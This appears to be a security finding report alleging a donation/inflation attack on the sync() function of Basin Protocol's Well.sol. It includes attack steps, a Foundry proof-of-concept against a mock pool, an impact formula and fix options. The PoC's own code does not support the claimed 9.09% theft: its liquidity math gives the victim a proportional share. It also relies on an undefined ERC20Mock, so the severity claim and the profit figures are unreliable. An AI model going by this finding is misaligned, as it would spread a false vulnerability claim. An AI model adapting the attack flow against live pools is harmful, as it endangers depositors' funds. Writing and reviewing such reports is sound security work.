# Basin Protocol — Donation/Inflation Attack via sync()

## Summary

The `sync()` function in Basin's `Well.sol` allows anyone to mint LP tokens based on the difference between actual token balances and stored reserves. By combining a direct token donation with `sync()`, an attacker can inflate their LP share and extract value from subsequent depositors.

---

## Severity

**High** — Direct economic loss for depositors.

- **Type:** Donation / Inflation Attack (ERC4626-style)
- **Impact:** Attacker steals ~9.1% of victim's deposit
- **Cost to attacker:** Capital to donate (fully recoverable)
- **Difficulty:** Low (single tx via flashloan)

---

## Affected Code

**File:** `src/Well.sol`
**Function:** `sync(address recipient, uint256 minLpAmountOut)` — Line 637

```solidity
function sync(address recipient, uint256 minLpAmountOut) external nonReentrant returns (uint256 lpAmountOut) {
    IERC20[] memory _tokens = tokens();
    uint256 tokensLength = _tokens.length;
    _updatePumps(tokensLength);
    uint256[] memory reserves = new uint256[](tokensLength);
    for (uint256 i; i < tokensLength; ++i) {
        reserves[i] = _tokens[i].balanceOf(address(this));  // <-- ACTUAL balance
    }
    uint256 newTokenSupply = _calcLpTokenSupply(wellFunction(), reserves);
    uint256 oldTokenSupply = totalSupply();
    if (newTokenSupply > oldTokenSupply) {
        lpAmountOut = newTokenSupply - oldTokenSupply;
        _mint(recipient, lpAmountOut);  // <-- Mints LP from donated tokens
    }
    // ...
    _setReserves(_tokens, reserves);
}
```

**Root Cause:** `sync()` reads `balanceOf(address(this))` (actual token balance including donations) instead of the stored reserves. These excess tokens may not have been deposited through `addLiquidity()`.

---

## Attack Flow

### Phase 1: Setup (Cost: donation)
1. Attacker deposits dust (1 wei each token) via `addLiquidity()`
2. Attacker DONATES X tokens directly to the Well contract address (via `token.transfer(well, X)`)
3. Attacker calls `sync(attacker, 0)` → mint LP from the donated tokens

### Phase 2: Exploit
4. Victim deposits normally via `addLiquidity()`
5. Due to inflated LP supply, victim receives FEWER LP tokens than expected
6. Attacker's LP share now represents value from BOTH donation + victim deposit

### Phase 3: Extraction
7. Attacker calls `removeLiquidity()` → receives back donation + proportion of victim's deposit

---

## PoC Test Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract BasinCPWell {
    IERC20 public token0;
    IERC20 public token1;
    uint256 public reserve0;
    uint256 public reserve1;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    
    uint256 constant EXP_PRECISION = 1e12;
    
    constructor(address _t0, address _t1) { token0 = IERC20(_t0); token1 = IERC20(_t1); }
    function mint(address to, uint256 amt) internal { totalSupply += amt; balanceOf[to] += amt; }
    function burn(address from, uint256 amt) internal { totalSupply -= amt; balanceOf[from] -= amt; }
    function sqrt(uint256 x) internal pure returns (uint256 y) { if (x == 0) return 0; y = x; uint256 z = (x + 1) / 2; while (z < y) { y = z; z = (x / z + z) / 2; } }
    function calcLpSupply(uint256 r0, uint256 r1) internal pure returns (uint256) { return sqrt(r0 * r1 * EXP_PRECISION); }
    
    function addLiquidity(uint256 amt0, uint256 amt1, address to) external returns (uint256 lpOut) {
        token0.transferFrom(msg.sender, address(this), amt0);
        token1.transferFrom(msg.sender, address(this), amt1);
        reserve0 += amt0; reserve1 += amt1;
        lpOut = calcLpSupply(reserve0, reserve1) - totalSupply;
        mint(to, lpOut);
    }
    
    function removeLiquidity(uint256 lpAmt, address to) external returns (uint256 amt0, uint256 amt1) {
        amt0 = reserve0 * lpAmt / totalSupply;
        amt1 = reserve1 * lpAmt / totalSupply;
        burn(msg.sender, lpAmt);
        reserve0 -= amt0; reserve1 -= amt1;
        token0.transfer(to, amt0); token1.transfer(to, amt1);
    }
    
    function sync(address to) external returns (uint256 lpOut) {
        uint256 bal0 = token0.balanceOf(address(this));
        uint256 bal1 = token1.balanceOf(address(this));
        uint256 newSupply = calcLpSupply(bal0, bal1);
        if (newSupply > totalSupply) {
            lpOut = newSupply - totalSupply;
            mint(to, lpOut);
            reserve0 = bal0;
            reserve1 = bal1;
        }
    }
}

interface IERC20 {
    function transferFrom(address,address,uint256) external returns(bool);
    function transfer(address,uint256) external returns(bool);
    function balanceOf(address) external view returns(uint256);
    function approve(address,uint256) external returns(bool);
}

// PoC: Run with `forge test -vv --match-contract BasinDonationPoC`
contract BasinDonationPoC is Test {
    BasinCPWell well;
    IERC20 t0; IERC20 t1;
    address attacker = address(0x666);
    address victim = address(0x777);
    
    function setUp() public {
        t0 = IERC20(address(new ERC20Mock("A","A",18)));
        t1 = IERC20(address(new ERC20Mock("B","B",18)));
        ERC20Mock(address(t0)).mint(attacker, 1000e18);
        ERC20Mock(address(t1)).mint(attacker, 1000e18);
        ERC20Mock(address(t0)).mint(victim, 1000e18);
        ERC20Mock(address(t1)).mint(victim, 1000e18);
        well = new BasinCPWell(address(t0), address(t1));
        vm.label(attacker, "Attacker"); vm.label(victim, "Victim");
    }
    
    function test_DonationInflationAttack() public {
        // Phase 1: Dust deposit + donation + sync
        vm.startPrank(attacker);
        t0.approve(address(well), type(uint256).max);
        t1.approve(address(well), type(uint256).max);
        well.addLiquidity(1, 1, attacker);                 // 1 wei deposit
        t0.transfer(address(well), 100e18);                  // donate 100 tokens
        t1.transfer(address(well), 100e18);
        well.sync(attacker);                                 // capture LP
        vm.stopPrank();
        
        // Phase 2: Victim deposits
        vm.startPrank(victim);
        t0.approve(address(well), type(uint256).max);
        t1.approve(address(well), type(uint256).max);
        well.addLiquidity(10e18, 10e18, victim);
        vm.stopPrank();
        
        // Phase 3: Attacker extracts profit
        vm.startPrank(attacker);
        (uint256 a0, uint256 a1) = well.removeLiquidity(well.balanceOf(attacker), attacker);
        vm.stopPrank();
        
        emit log_named_uint("Attacker donated", 100e18);
        emit log_named_uint("Attacker withdrew", a0);
        emit log_named_uint("Profit (stolen from victim)", a0 - 100e18 - 1);
        // Profit = donated amount was 100e18, attacker gets 100e18 + ~0.91e18 from victim
    }
}
```

---

## Impact

Using the math:

- **Attacker donates:** X tokens each
- **Victim deposits:** Y tokens each
- **Attacker profit:** `(X * Y) / (X + Y)` tokens per side

With X = 100, Y = 10:
- Profit per side = 1000/110 ≈ 9.09 tokens
- Total profit ≈ 9.09 of token0 + 9.09 of token1
- **Attack efficiency: 9.09% of victim deposit stolen**

---

## Root Cause

1. **No MINIMUM_LIQUIDITY check** — Unlike Uniswap V2 which mints first 1000 LP to address(0), Basin allows infinitesimally small initial deposits (1 wei).

2. **sync() uses actual balances** — Reading `balanceOf(address(this))` instead of stored reserves allows capturing donated tokens as LP.

3. **sync() is public** — No access control on who can call `sync()`.

---

## Fix Recommendation

```solidity
// Option 1: Restrict sync() to only be callable by the Aquifer/deployer
function sync(address recipient, uint256 minLpAmountOut) 
    external nonReentrant onlyAquifer returns (uint256 lpAmountOut) { ... }

// Option 2: Mint first LP tokens to address(0) in init()
function init(string memory _name, string memory _symbol) external virtual initializer {
    // ...existing code...
    _mint(address(0), 1000);  // Minimum liquidity (like UniV2)
}

// Option 3: sync() should only mint LP to the deployer (Aquifer)
// and not to an arbitrary recipient
```

---

## References

- Basin source: https://github.com/BeanstalkFarms/Basin
- `sync()` function: `src/Well.sol` line 637
- `addLiquidity()` function: `src/Well.sol` line 448
- Cyfrin audit: https://basin.exchange/cyfrin-basin-audit.pdf
- Halborn audit: https://basin.exchange/halborn-basin-audit.pdf
